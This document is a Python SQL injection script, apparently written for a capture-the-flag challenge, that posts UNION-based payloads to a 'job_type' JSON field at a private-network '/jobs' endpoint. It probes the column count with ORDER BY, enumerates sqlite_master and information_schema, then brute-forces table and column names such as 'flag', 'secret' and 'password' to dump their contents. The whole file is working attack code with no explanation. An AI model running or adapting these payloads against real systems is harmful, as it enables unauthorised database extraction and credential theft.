import requests
import json

TARGET_URL = "http://10.0.162.112:80/jobs"

PAYLOADS = [
    "back-end' ORDER BY 1-- ",
    "back-end' ORDER BY 4-- ",
    "back-end' ORDER BY 5-- ",
    "back-end' UNION SELECT 1,2,3,4-- ",
    "back-end' UNION SELECT 1,group_concat(name),3,4 FROM sqlite_master WHERE type='table'-- ",
    "back-end' UNION SELECT 1,group_concat(sql),3,4 FROM sqlite_master-- ",
    "back-end' UNION SELECT 1,schema_name,3,4 FROM information_schema.schemata-- ",
]

def main():
    session = requests.Session()
    session.headers.update({"Content-Type": "application/json"})
    
    found_tables = None
    found_db = None
    
    for payload in PAYLOADS:
        data = {"job_type": payload}
        try:
            resp = session.post(TARGET_URL, json=data, timeout=10)
            print(f"[*] Payload: {payload}")
            print(f"[*] Status: {resp.status_code}")
            try:
                resp_json = resp.json()
                print(f"[*] Response: {json.dumps(resp_json, indent=2)}")
                if resp.status_code == 200 and resp_json:
                    if "sqlite_master" in payload and "group_concat(name)" in payload:
                        found_tables = resp_json
                    if "sqlite_master" in payload and "group_concat(sql)" in payload:
                        found_tables = resp_json
                    if "information_schema" in payload:
                        found_db = resp_json
            except Exception:
                print(f"[*] Response (text): {resp.text[:500]}")
        except Exception as e:
            print(f"[!] Error with payload '{payload}': {e}")
        print("-" * 80)
    
    # Try to find flag table and dump it
    # Common flag table names
    flag_table_names = ["flag", "flags", "secret", "secrets", "hidden_flag", "ctf_flag", "f1ag", "fl4g"]
    
    # If we got table names from sqlite_master, parse them
    table_names_to_try = list(flag_table_names)
    if found_tables:
        print("[+] Found table info, extracting table names...")
        for item in found_tables:
            if isinstance(item, dict):
                for key, val in item.items():
                    if val and isinstance(val, str) and ("flag" in val.lower() or "CREATE" in val.upper()):
                        print(f"[+] Interesting value: {key} = {val}")
                        # Extract table names from CREATE TABLE statements
                        if "CREATE" in val.upper():
                            import re
                            matches = re.findall(r'CREATE\s+TABLE\s+[IF NOT EXISTS\s]*["\']?(\w+)["\']?', val, re.IGNORECASE)
                            table_names_to_try.extend(matches)
    
    # Also try extracting table names explicitly if not already done
    extract_payloads = [
        "back-end' UNION SELECT 1,group_concat(name),3,4 FROM sqlite_master WHERE type='table'-- ",
        "back-end' UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables-- ",
    ]
    
    for payload in extract_payloads:
        try:
            resp = session.post(TARGET_URL, json={"job_type": payload}, timeout=10)
            if resp.status_code == 200:
                try:
                    resp_json = resp.json()
                    if resp_json:
                        print(f"[+] Table enumeration payload: {payload}")
                        print(f"[+] Result: {json.dumps(resp_json, indent=2)}")
                        for item in resp_json:
                            if isinstance(item, dict):
                                for key, val in item.items():
                                    if val and isinstance(val, str) and "," in val:
                                        new_tables = [t.strip() for t in val.split(",")]
                                        table_names_to_try.extend(new_tables)
                except Exception:
                    pass
        except Exception:
            pass
    
    # Remove duplicates while preserving order
    seen = set()
    unique_tables = []
    for t in table_names_to_try:
        t_lower = t.lower()
        if t_lower not in seen:
            seen.add(t_lower)
            unique_tables.append(t)
    
    print(f"\n[+] Trying to dump these tables: {unique_tables}")
    
    # Try to dump each table
    for table in unique_tables:
        # SQLite approach
        dump_payloads_sqlite = [
            f"back-end' UNION SELECT 1,group_concat(id || ':' || name || ':' || type || ':' || description),3,4 FROM {table}-- ",
            f"back-end' UNION SELECT 1,group_concat(*),3,4 FROM {table}-- ",
            f"back-end' UNION SELECT 1,group_concat(flag),3,4 FROM {table}-- ",
            f"back-end' UNION SELECT 1,group_concat(id || '::' || flag),3,4 FROM {table}-- ",
        ]
        # MySQL approach  
        dump_payloads_mysql = [
            f"back-end' UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHERE table_name='{table}'-- ",
        ]
        
        all_dump_payloads = dump_payloads_sqlite + dump_payloads_mysql
        
        for payload in all_dump_payloads:
            try:
                resp = session.post(TARGET_URL, json={"job_type": payload}, timeout=10)
                if resp.status_code == 200:
                    try:
                        resp_json = resp.json()
                        if resp_json and len(resp_json) > 0:
                            print(f"\n[+] SUCCESS with table '{table}' payload: {payload}")
                            print(f"[+] Data: {json.dumps(resp_json, indent=2)}")
                            for item in resp_json:
                                if isinstance(item, dict):
                                    for key, val in item.items():
                                        if val and isinstance(val, str) and ("flag" in str(val).lower() or "ctf" in str(val).lower() or "HTB" in str(val) or "{" in str(val)):
                                            print(f"\n{'='*60}")
                                            print(f"[!!!] POTENTIAL FLAG FOUND: {val}")
                                            print(f"{'='*60}")
                    except Exception:
                        pass
            except Exception:
                pass
    
    # Brute force column names for flag table
    common_columns = ["flag", "secret", "password", "value", "data", "content", "text", "id", "name"]
    for table in unique_tables:
        for col in common_columns:
            payload = f"back-end' UNION SELECT 1,group_concat({col}),3,4 FROM {table}-- "
            try:
                resp = session.post(TARGET_URL, json={"job_type": payload}, timeout=10)
                if resp.status_code == 200:
                    try:
                        resp_json = resp.json()
                        if resp_json:
                            for item in resp_json:
                                if isinstance(item, dict):
                                    for key, val in item.items():
                                        if val and isinstance(val, str) and len(val) > 0 and val != "2" and val != "3" and val != "4" and val != "back-end":
                                            print(f"[+] Table '{table}', Column '{col}': {val}")
                                            if "flag" in val.lower() or "{" in val:
                                                print(f"\n{'='*60}")
                                                print(f"[!!!] FLAG: {val}")
                                                print(f"{'='*60}")
                    except Exception:
                        pass
            except Exception:
                pass

if __name__ == "__main__":
    main()